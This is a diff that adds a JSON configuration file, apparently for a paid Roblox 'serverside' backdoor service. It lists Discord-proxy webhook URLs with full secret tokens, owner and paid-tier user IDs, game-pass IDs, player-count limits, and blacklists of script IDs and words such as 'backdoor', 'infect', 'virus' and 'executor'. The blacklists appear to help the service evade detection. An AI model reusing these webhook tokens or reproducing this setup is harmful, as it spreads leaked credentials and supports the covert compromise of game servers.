@@ -1,0 +1,102 @@
+{
+	"webhooks": [
+	"https://webhook.lewisakura.moe/api/webhooks/1216443121542500392/5i_jWJsEoWUASSwy_DZ47kbVmTS125ROO36NcAb2E5TzWpH0P5broxO7nq41eDJBkJy6",
+	"https://webhook.lewisakura.moe/api/webhooks/1216443222654587050/lRF9OmRsbMgYKgjDbXVJg-fvpI3770IOQTSzoOlzs4yxGdkn97Fd5OO-jR3GgPazKEoC",
+	"https://webhook.lewisakura.moe/api/webhooks/1216443841213894786/9POGPBUhvr1V10itKZ2M0goZaF6Kx0BrnCzRKnXpfgyINWtMKgO0a-14N5JgNjShQLBH",
+	"https://webhook.lewisakura.moe/api/webhooks/1216444042888609873/VjbXyHLn7mougRfNgbSMfrEl1OmiqnUYZ62Q6wsu50IU3hu2uXvO58tmR7zypXp8K_FV",
+	"https://webhook.lewisakura.moe/api/webhooks/1216443942120198286/OLCZ8c7JNdZFGv8jQbBOnwMCQOS4YCSGPqVhAKft5Zi-XT56rfgsNUfJxUwL5OVw1J1w"
+	],
+	"playercount": [
+	200,
+	2000
+	],
+	"passes": [
+	144853052,
+	145191525,
+	0
+	],
+	"group": [
+	16336136
+	],
+	"owners": [
+	758089661, 
+	132039217, 
+	2802861856, 
+	1077748060,
+	4840491472,
+	5294860116
+	],
+	"staff": [
+	5653380344
+	],
+	"deluxe": [
+	0
+	],
+	"premium": [
+	4243348744,
+	724998673,
+	2815483572,
+	3684605949,
+	1005046065,
+	1031689559,
+	5413988874
+	],
+	"standard": [
+	1972939915
+	],
+	"blacklisted": [
+	0
+	],
+	"blacklistedscripts": [
+	"13007387048",
+	"10868847330",
+	"7052048158",
+	"12935858436",
+	"WhitelistType",
+	"7804327506",
+	"14208473055",
+	"PromptPurchase",
+	"MarketPlaceService"
+	],
+	"blacklistedwords": [
+	"azure",
+	"bx",
+	"serverside",
+	"infect",
+	"backdoor",
+	"ss.fun",
+	"metability",
+	"require",
+	"getfenv",
+	"utg",
+	"whitelist",
+	"blacklist",
+	"standard",
+	"premium",
+	"hack",
+	"jdss",
+	"johndoe",
+	"john doe",
+	"builderx",
+	"aureus",
+	"exploit",
+	"shunzi",
+	"bomber",
+	"melta",
+	"execute",
+	"script",
+	"kasper",
+	"gui",
+	"snitch",
+	"model",
+	"module",
+	"virus",
+	"shutdown",
+	"chavo",
+	"executor",
+	"nexus"
+	],
+	"blgames": [
+	0
+	]
+}
